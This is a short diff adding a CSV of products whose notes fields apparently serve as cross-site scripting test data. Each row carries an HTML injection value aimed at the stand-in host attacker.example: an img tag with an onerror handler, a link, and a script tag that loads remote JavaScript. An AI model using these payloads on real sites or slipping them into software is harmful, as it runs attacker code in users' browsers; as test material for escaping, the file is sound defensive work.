@@ -1,0 +1,4 @@
+product,units,notes
+Widget,12,"<img src=http://attacker.example/pixel.png onerror=alert(1)>"
+Gadget,7,"<a href=""http://attacker.example/x"">details</a>"
+Doohickey,3,"<script src=http://attacker.example/x.js></script>"
